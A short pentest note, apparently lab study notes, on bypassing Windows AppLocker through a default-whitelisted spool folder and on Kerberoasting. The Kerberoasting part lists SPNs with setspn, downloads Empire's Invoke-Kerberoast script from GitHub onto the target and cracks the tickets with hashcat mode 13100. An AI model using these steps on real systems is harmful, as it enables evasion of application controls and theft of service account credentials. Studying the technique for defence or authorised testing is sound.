# App Locker

> Shahrukh Tramboo | March 14th, 2022

--------------------------------------


There are many ways to bypass AppLocker.

If AppLocker is configured with default AppLocker rules, we can bypass it by placing our executable in the following directory: 
```bash
C:\Windows\System32\spool\drivers\color
```
- This is whitelisted by default. 

**Kerberoasting**

If we run 
```bash
setspn -T medin -Q */*
```
we can extract all accounts in the SPN.

SPN is the Service Principal Name, and is the mapping between service and account.

Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.

The script is at 

https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1

Then Download it to the target and after writing this code at the end of script
```bash
Invoke-Kerberoast -OutputFormat hashcat
```

Now crach the hash with John the ripper
or hashcat


Lets use hashcat to bruteforce this password. The type of hash we're cracking is 
```bash
Kerberos 5 TGS-REP etype 23 
```
and the hashcat code for this is 13100.




